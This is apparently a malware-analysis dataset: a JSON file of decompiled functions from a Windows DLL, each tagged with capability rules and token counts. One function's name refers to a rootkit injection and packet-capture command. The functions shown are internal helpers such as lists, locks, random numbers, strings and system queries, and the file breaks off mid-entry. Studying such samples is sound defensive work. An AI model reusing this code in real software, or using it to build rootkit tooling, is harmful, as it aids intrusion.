{
    "20001000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20001000(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    uint var_4h;\n    \n    // [00] -r-x section size 180224 named .text\n    if (arg_8h == 0x18) {\n        if (*in_EAX == 0) {\n            piVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x18);\n            if (piVar3 == NULL) {\n                iVar2 = 0x21590004;\n            }\n            else {\n                piVar3[1] = in_EAX[1];\n                piVar3[2] = in_EAX[2];\n                piVar3[3] = in_EAX[3];\n                iVar1 = *(in_EAX + 4);\n                *(piVar3 + 4) = iVar1;\n                if (iVar1 == 1) {\n                    *(piVar3 + 0x13) = *(in_EAX + 0x13);\n                    *(piVar3 + 0x12) = *(in_EAX + 0x12);\n                }\n                else if ((iVar1 == 6) || (iVar1 == 0x11)) {\n                    *(piVar3 + 5) = *(in_EAX + 5);\n                    *(piVar3 + 0x12) = *(in_EAX + 0x12);\n                }\n                *piVar3 = 0;\n                fcn.20001cdb(0x20046be4, &arg_8h, 1);\n                ppiVar4 = 0x20046bf0;\n                iVar2 = *0x20046bf0;\n                while (iVar2 != 0) {\n                    ppiVar4 = *ppiVar4;\n                    iVar2 = *ppiVar4;\n                }\n                *ppiVar4 = piVar3;\n                fcn.20001ceb(0x20046be4, &arg_8h, 1);\n                iVar2 = 0;\n            }\n        }\n        else if (*in_EAX == 1) {\n            fcn.20001cdb(0x20046be4, &arg_8h, 1);\n            piVar3 = 0x20046bf0;\n            iVar2 = *0x20046bf0;\n            while (iVar2 != 0) {\n                piVar5 = *piVar3;\n                if ((((piVar5[3] == in_EAX[3]) && (iVar1 = *(piVar5 + 4),  iVar1 == *(in_EAX + 4))) &&\n                    (piVar5[1] == in_EAX[1])) && (piVar5[2] == in_EAX[2])) {\n                    if (iVar1 == 1) {\n                        if (*(piVar5 + 0x13) == *(in_EAX + 0x13)) {\n                            bVar6 = *(piVar5 + 0x12) == *(in_EAX + 0x12);\ncode_r0x2000114c:\n                            if (bVar6) goto code_r0x20001179;\n                        }\n                    }\n                    else {\n                        if ((iVar1 != 6) && (iVar1 != 0x11)) {\ncode_r0x20001179:\n                            *piVar3 = *piVar5;\n                            (*_sym.imp.msvcrt.dll_free)(piVar5);\n                            goto code_r0x20001158;\n                        }\n                        if (*(piVar5 + 5) == *(in_EAX + 5)) {\n                            bVar6 = *(piVar5 + 0x12) == *(in_EAX + 0x12);\n                            goto code_r0x2000114c;\n                        }\n                    }\n                }\n                piVar3 = piVar5;\n                iVar2 = *piVar5;\n            }\n            piVar5 = NULL;\ncode_r0x20001158:\n            fcn.20001ceb(0x20046be4, &arg_8h, 1);\n            iVar2 = (-(piVar5 != NULL) & 0xdea6fffb) + 0x21590005;\n        }\n        else {\n            iVar2 = 0x21590001;\n        }\n    }\n    else {\n        iVar2 = 0x21590009;\n    }\n    return iVar2;\n}\n",
        "token_count": 999
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nsym.inj_snake_Win32.dll_rk_pcap_cmd\n          (int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n          uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13, \n          uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, uint noname_20\n          , uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, uint noname_26, \n          uint noname_27, uint noname_28, uint arg_7ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_50h;\n    uint var_58h;\n    uint var_5ch;\n    uchar auStack172 [116];\n    uint s;\n    uint uStack40;\n    uint uStack32;\n    int32_t aiStack28 [6];\n    \n    if ((*noname_0 == 0) || (*noname_0 == 1)) {\n        iVar1 = fcn.20001000(0x18);\n        if (iVar1 == 0) {\n            sub.ntdll.dll_memset(auStack172, 0, 0x90);\n            uStack40 = 0x80;\n            uStack32 = 0;\n            iVar1 = fcn.20011f1d(*0x20046be0, noname_0, 0x18, auStack172, 0);\n            if (iVar1 != 0) {\n                piVar3 = aiStack28;\n                for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar3 = *noname_0;\n                    noname_0 = noname_0 + 1;\n                    piVar3 = piVar3 + 1;\n                }\n                aiStack28[0] = 1;\n                fcn.20001000(0x18);\n            }\n        }\n    }\n    else {\n        iVar1 = 0x21590064;\n    }\n    return iVar1;\n}\n",
        "token_count": 552
    },
    "20001268": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.20001268(int32_t *arg_8h, int32_t src, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (src == 0) {\n        arg_8h[1] = 0;\n    }\n    else {\n        iVar1 = (*_sym.imp.msvcrt.dll__strdup)(src);\n        arg_8h[1] = iVar1;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, arg_10h, 0, src);\n    *arg_8h = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 144
    },
    "20001658": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20001658(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    var_4h = 0x4000;\n    if (arg_ch == NULL) {\n        uVar2 = 0x21590066;\n    }\n    else {\n        while (iVar5 = var_4h,  iVar3 = (*_sym.imp.msvcrt.dll_malloc)(iVar5),  iVar3 != 0) {\n            iVar4 = (*_sym.imp.ntdll.dll_ZwQuerySystemInformation)(arg_8h, iVar3, iVar5, &var_4h);\n            if (iVar4 != -0x3ffffffc) {\n                if (iVar4 == 0) {\n                    *arg_ch = iVar3;\n                    return 0;\n                }\n                (*pcVar1)(iVar3);\n                return 0xffffffff;\n            }\n            (*pcVar1)(iVar3);\n            if ((arg_8h != 6) && (arg_8h != 0xb)) {\n                var_4h = iVar5 * 2;\n            }\n        }\n        uVar2 = 0x21590004;\n    }\n    return uVar2;\n}\n",
        "token_count": 317
    },
    "200018bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.200018bf(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t pbBuffer;\n    \n    while (*0x20046c08 == 1) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10);\n    }\n    if (*0x20046c08 == 0) {\n        iVar1 = fcn.2000184f();\n        if (iVar1 == 0) {\n            uVar2 = fcn.200018bf();\n            return uVar2;\n        }\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(*0x20046c04, 4, &pbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return pbBuffer & 0x7fffffff;\n}\n",
        "token_count": 185
    },
    "20001976": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20001976(int32_t *param_1)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 5);\n    if ((param_1[1] < 1) && (param_1[2] != -1)) {\n        bVar1 = false;\n        param_1[2] = param_1[2] + 1;\n    }\n    else {\n        bVar1 = true;\n        *param_1 = *param_1 + 1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    param_1[0xc] = iVar2;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 5);\n    if (bVar1) {\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(param_1[3], 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "20001bcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20001bcd(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x20001bd4. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "20001bdb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20001bdb(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_InterlockedIncrement;\n    pcVar1 = _sym.imp.KERNEL32.dll_InterlockedCompareExchange;\n    if (arg_ch == 0) {\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(arg_8h);\n        pcVar1 = _sym.imp.KERNEL32.dll_InterlockedCompareExchange;\n        while (iVar4 = (*pcVar1)(arg_8h + 4, 0, 0),  iVar4 != 0) {\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(arg_8h);\n            arg_ch = 0;\n            uVar3 = fcn.200018bf();\n            if (uVar3 % 10 != 0) {\n                do {\n                    arg_ch = arg_ch + 1;\n                    uVar3 = fcn.200018bf();\n                } while (arg_ch < uVar3 % 10);\n            }\n            (*pcVar2)(arg_8h);\n        }\n    }\n    else if (arg_ch == 1) {\n        while (iVar4 = (*pcVar1)(arg_8h + 4, 1, 0),  iVar4 != 0) {\n            arg_ch = 0;\n            uVar3 = fcn.200018bf();\n            if (uVar3 % 10 != 0) {\n                do {\n                    arg_ch = arg_ch + 1;\n                    uVar3 = fcn.200018bf();\n                } while (arg_ch < uVar3 % 10);\n            }\n        }\n        do {\n            iVar4 = (*pcVar1)(arg_8h, 0, 0);\n        } while (iVar4 != 0);\n    }\n    else if (arg_ch == 2) {\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 467
    },
    "20001caa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20001caa(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch != 0) {\n        if (arg_ch == 1) {\n            arg_8h = arg_8h + 4;\n        }\n        else {\n            if (arg_ch != 2) {\n                return;\n            }\n            arg_8h = arg_8h + 8;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(arg_8h);\n    return;\n}\n",
        "token_count": 120
    },
    "20001d41": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20001d41(int32_t *param_1)\n\n{\n    if ((param_1 != NULL) && (*param_1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 50
    },
    "20001d99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20001d99(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (arg_14h == 0) {\n        arg_14h = 0x2002d456;\n    }\n    iVar2 = sub.ntdll.dll_strcmp(0x20034110, arg_14h);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.msvcrt.dll_setlocale)(2, arg_14h),  iVar2 != 0)) {\n        (*_sym.imp.ntdll.dll_strncpy)(0x20034110, arg_14h, 0x20);\n    }\n    uVar4 = 0;\n    if (arg_10h == -1) {\n        cVar1 = *arg_8h;\n        iVar2 = arg_ch;\n        while ((cVar1 != '\\0' && (iVar3 = (*_sym.imp.msvcrt.dll_mbtowc)(iVar2, arg_8h, 4),  iVar3 != 0))) {\n            arg_8h = arg_8h + iVar3;\n            uVar4 = uVar4 + 1;\n            iVar2 = iVar2 + 2;\n            cVar1 = *arg_8h;\n        }\n    }\n    else if (*arg_8h != '\\0') {\n        iVar2 = arg_ch;\n        do {\n            if ((arg_10h - 1U <= uVar4) || (iVar3 = (*_sym.imp.msvcrt.dll_mbtowc)(iVar2, arg_8h, 4),  iVar3 == 0))\n            break;\n            arg_8h = arg_8h + iVar3;\n            uVar4 = uVar4 + 1;\n            iVar2 = iVar2 + 2;\n        } while (*arg_8h != '\\0');\n    }\n    *(arg_ch + uVar4 * 2) = 0;\n    return 0;\n}\n",
        "token_count": 474
    },
    "20001fa5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20001fa5(char *arg_8h, int32_t pwc)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = pwc;\n    if (pwc == 0) {\n        iVar2 = 0x2002d456;\n    }\n    iVar1 = sub.ntdll.dll_strcmp(0x20034110, iVar2);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.msvcrt.dll_setlocale)(2, iVar2);\n        if (iVar1 != 0) {\n            (*_sym.imp.ntdll.dll_strncpy)(0x20034110, iVar2, 0x20);\n        }\n    }\n    iVar2 = 0;\n    for (; *arg_8h != '\\0'; arg_8h = arg_8h + iVar1) {\n        iVar1 = (*_sym.imp.msvcrt.dll_mbtowc)(&pwc, arg_8h, 4);\n        if (iVar1 == 0) break;\n        if (iVar1 == -1) {\n            iVar1 = 1;\n        }\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2 + 1;\n}\n",
        "token_count": 274
    },
    "20002016": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20002016(int32_t arg_8h, int32_t s)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint s2;\n    \n    if ((arg_8h != 0) && (s != 0)) {\n        iVar3 = sub.ntdll.dll_strlen(s);\n        pcVar1 = _sym.imp.msvcrt.dll__strdup;\n        if (iVar3 == 0) {\n            return arg_8h;\n        }\n        pcVar4 = (*_sym.imp.msvcrt.dll__strdup)(arg_8h);\n        if (pcVar4 != NULL) {\n            pcVar5 = (*pcVar1)(s);\n            pcVar1 = _sym.imp.ntdll.dll_toupper;\n            if (pcVar5 != NULL) {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (pcVar7 = pcVar5,  cVar2 != '\\0') {\n                    cVar2 = (*pcVar1)(*pcVar6);\n                    *pcVar6 = cVar2;\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n                for (; *pcVar7 != '\\0'; pcVar7 = pcVar7 + 1) {\n                    cVar2 = (*pcVar1)(*pcVar7);\n                    *pcVar7 = cVar2;\n                }\n                iVar3 = (*_sym.imp.ntdll.dll_strstr)(pcVar4, pcVar5);\n                pcVar1 = _sym.imp.msvcrt.dll_free;\n                if (iVar3 != 0) {\n                    iVar3 = iVar3 + (arg_8h - pcVar4);\n                }\n                (*_sym.imp.msvcrt.dll_free)(pcVar4);\n                (*pcVar1)(pcVar5);\n                return iVar3;\n            }\n            (*_sym.imp.msvcrt.dll_free)(pcVar4);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 471
    },
    "2000266e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.2000266e(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    char *unaff_ESI;\n    \n    if ((unaff_ESI == NULL) || (*unaff_ESI == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar1 = sub.ntdll.dll_strlen();\n        uVar2 = 0;\n        uVar3 = 0;\n        if (uVar1 != 0) {\n            do {\n                uVar2 = uVar2 << 3 ^ unaff_ESI[uVar3];\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < uVar1);\n        }\n        uVar2 = uVar2 ^ uVar1 + 1 & 0xffff;\n        if (uVar2 == 0) {\n            return 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 216
    },
    "200026a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200026a7(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    if (unaff_EDI != 0) {\n        iVar3 = *(unaff_EDI + 0x34);\n        while (iVar3 != 0) {\n            iVar3 = *(*(unaff_EDI + 0x34) + 0x10);\n            while (iVar3 != 0) {\n                if (*(iVar3 + 0x18) == 0) {\n                    *(unaff_EDI + 0x38) = *(iVar3 + 0x1c);\n                }\n                else {\n                    *(*(iVar3 + 0x18) + 0x1c) = *(iVar3 + 0x1c);\n                }\n                if (*(iVar3 + 0x1c) == 0) {\n                    *(unaff_EDI + 0x3c) = *(iVar3 + 0x18);\n                }\n                else {\n                    *(*(iVar3 + 0x1c) + 0x18) = *(iVar3 + 0x18);\n                }\n                iVar1 = *(iVar3 + 0x14);\n                (*pcVar2)(iVar3);\n                iVar3 = iVar1;\n            }\n            iVar3 = *(unaff_EDI + 0x34);\n            *(unaff_EDI + 0x34) = *(iVar3 + 0x18);\n            (*pcVar2)(iVar3);\n            iVar3 = *(unaff_EDI + 0x34);\n        }\n        *(unaff_EDI + 0x34) = 0;\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "20002815": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20002815(void)\n\n{\n    uint *unaff_ESI;\n    \n    fcn.20001637(*unaff_ESI);\n    if (unaff_ESI[1] != 0) {\n        fcn.2000157d(0x20047340);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "20002847": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.20002847(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 100) != 0) && (*param_1 == *(in_EAX + 0x68))) {\n        *param_1 = *(in_EAX + 0x6c);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "2000297f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2000297f(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint var_40h;\n    uint var_38h;\n    \n    if (unaff_ESI == 0) {\n        return;\n    }\n    if (arg_8h == 0) {\n        return;\n    }\n    iVar1 = fcn.20002788(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    if (arg_10h != 0) {\n        iVar2 = fcn.20002965(arg_ch);\n        if (iVar2 == -1) {\n            return;\n        }\n        iVar3 = (**(*(unaff_ESI + 0x44) + 0x14))(*(unaff_ESI + 0x48), &var_40h, 0x40, iVar2);\n        if (iVar3 != 0) {\n            return;\n        }\n        var_38h = 0xffff;\n        iVar2 = (**(*(unaff_ESI + 0x44) + 0x18))(*(unaff_ESI + 0x48), &var_40h, 0x40, iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n        *(unaff_ESI + 0x18) = *(unaff_ESI + 0x18) + -1;\n        *(unaff_ESI + 0x20) = *(unaff_ESI + 0x20) + 1;\n        if (arg_10h != 2) {\n            fcn.2000282f();\n        }\n    }\n    iVar2 = *(iVar1 + 0x10);\n    iVar3 = *(iVar1 + 0x14);\n    if (iVar2 == 0) {\n        *(arg_8h + 0x10) = iVar3;\n    }\n    else {\n        *(iVar2 + 0x14) = iVar3;\n    }\n    if (iVar3 == 0) {\n        *(arg_8h + 0x14) = iVar2;\n    }\n    else {\n        *(iVar3 + 0x10) = iVar2;\n    }\n    if (*(iVar1 + 0x18) == 0) {\n        *(unaff_ESI + 0x38) = *(iVar1 + 0x1c);\n    }\n    else {\n        *(*(iVar1 + 0x18) + 0x1c) = *(iVar1 + 0x1c);\n    }\n    if (*(iVar1 + 0x1c) == 0) {\n        *(unaff_ESI + 0x3c) = *(iVar1 + 0x18);\n    }\n    else {\n        *(*(iVar1 + 0x1c) + 0x18) = *(iVar1 + 0x18);\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar1);\n    if (arg_10h != 2) {\n        fcn.200027a2();\n    }\n    return;\n}\n",
        "token_count": 705
    },
    "20002eae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20002eae(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    bVar3 = false;\n    iVar4 = fcn.20002de0(&var_4h, 2);\n    iVar2 = var_4h;\n    if (iVar4 == 0) {\n        bVar3 = true;\n        if (arg_ch == 0) {\n            piVar1 = var_4h + 4;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 != 0) goto code_r0x20002fb0;\n        }\n        if (0 < *(var_4h + 0x4c)) {\n            fcn.20002815();\n            iVar4 = iVar2 + 0x50;\n            iVar5 = fcn.200012e7(iVar4);\n            if (iVar5 != 0) {\n                fcn.200012c9(iVar4);\n                iVar2 = iVar2 + 0x58;\n                iVar5 = fcn.20001d41(iVar2);\n                if (iVar5 != 0) {\n                    fcn.20001d55(iVar2, 0);\n                }\n                fcn.200012a9(iVar4);\n                iVar4 = fcn.20001d41(iVar2);\n                if (iVar4 != 0) {\n                    fcn.20001d2f(iVar2);\n                }\n            }\n            iVar4 = fcn.20002de0(&var_4h, 2);\n        }\n    }\n    piVar1 = arg_8h * 4 + 0x2004735c;\n    if (*piVar1 != 0) {\n        (**(*(*piVar1 + 0x44) + 8))(*(var_4h + 0x48));\n        fcn.200026a7();\n        (*_sym.imp.msvcrt.dll_free)(*(*piVar1 + 0x40));\n    }\n    if (iVar4 == 0) {\n        fcn.20002815();\n        bVar3 = false;\n        fcn.2000161b(var_4h + 0x60);\n    }\n    (*_sym.imp.msvcrt.dll_free)(*piVar1);\n    *piVar1 = 0;\n    if (!bVar3) {\n        return 0;\n    }\ncode_r0x20002fb0:\n    fcn.20002815();\n    return 0;\n}\n",
        "token_count": 604
    },
    "200033be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200033be(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_ch;\n    int32_t var_4h;\n    \n    iVar2 = fcn.20002de0(&var_4h, 1);\n    if (iVar2 == 0) {\n        fcn.20002847();\n        uVar3 = fcn.20002744(arg_ch, arg_10h, arg_14h);\n        fcn.20002c2b(uVar3);\n        if ((-1 < *(var_4h + 0x4c)) &&\n           (((uVar1 = *(var_4h + 0x20),  1 < uVar1 && (*(var_4h + 0x18) <= uVar1 && uVar1 != *(var_4h + 0x18))) ||\n            ((*(var_4h + 0x10) >> 10) / 100 < uVar1)))) {\n            fcn.20002fbf(arg_8h);\n        }\n        fcn.20002815();\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 286
    },
    "2000343e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000343e(uint arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.20002de0(&var_8h, 1);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n        if (arg_10h != 0) {\n            var_4h = *arg_ch;\n            fcn.20002847();\n            arg_8h_00 = fcn.20002744(var_4h, arg_ch[2]);\n            if (arg_10h != 0) {\n                arg_ch = arg_ch + 1;\n                var_4h = arg_10h;\n                do {\n                    if (*arg_ch != -1) {\n                        fcn.2000297f(arg_8h_00, *arg_ch, 2);\n                    }\n                    arg_ch = arg_ch + 0x10;\n                    var_4h = var_4h + -1;\n                } while (var_4h != 0);\n            }\n            fcn.200027a2();\n            iVar2 = fcn.2000282f();\n            if (iVar2 == 0) {\n                if ((-1 < *(var_8h + 0x4c)) &&\n                   (((uVar1 = *(var_8h + 0x20),  1 < uVar1 && (*(var_8h + 0x18) <= uVar1 && uVar1 != *(var_8h + 0x18)))\n                    || ((*(var_8h + 0x10) >> 10) / 100 < uVar1)))) {\n                    fcn.20002fbf(arg_8h);\n                }\n                iVar2 = 0;\n            }\n        }\n        fcn.20002815();\n    }\n    return iVar2;\n}\n",
        "token_count": 461
    },
    "200035fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
